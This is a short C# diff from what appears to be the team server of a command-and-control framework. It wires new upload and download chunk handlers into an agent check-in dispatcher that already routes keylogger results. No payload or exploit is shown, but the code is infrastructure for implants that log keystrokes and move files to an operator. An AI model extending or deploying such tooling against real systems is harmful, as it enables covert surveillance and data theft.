@@ -18,14 +18,20 @@ namespace TeamServer.Handlers.CheckinHandler
             SuccessStrategy successStrategy,
             RunningStrategy runningStrategy,
             ErrorStrategy errorStrategy,
-            KeyloggerStrategy keyloggerStrategy)
+            UploadChunkStrategy uploadChunkStrategy,
+            KeyloggerStrategy keyloggerStrategy,
+            DownloadChunkStrategy downloadChunkStrategy)
         {
             _handlers = new Dictionary<Status, Func<JsonElement, Task>>()
             {
                 { SUCCESS, (element) => successStrategy.ProcessResponseAsync(element) },
                 { RUNNING, (element) =>  runningStrategy.ProcessResponseAsync(element) },
                 { ERROR, (element) => errorStrategy.ProcessResponseAsync(element) },
-                { COMPLETED, (element) => keyloggerStrategy.ProcessResponseAsync(element) }
+                { COMPLETED, (element) => keyloggerStrategy.ProcessResponseAsync(element) },
+                { MORE_TO_FOLLOW, (element) => uploadChunkStrategy.ProcessResponseAsync(element) },
+                { NO_MORE_TO_FOLLOW, (element) => uploadChunkStrategy.ProcessResponseAsync(element) },
+                { DOWNLOAD_CHUNK_STATUS, (element) => downloadChunkStrategy.ProcessResponseAsync(element) },
+                { DOWNLOAD_FINAL_STATUS, (element) => downloadChunkStrategy.ProcessResponseAsync(element) }
             };
         }
 
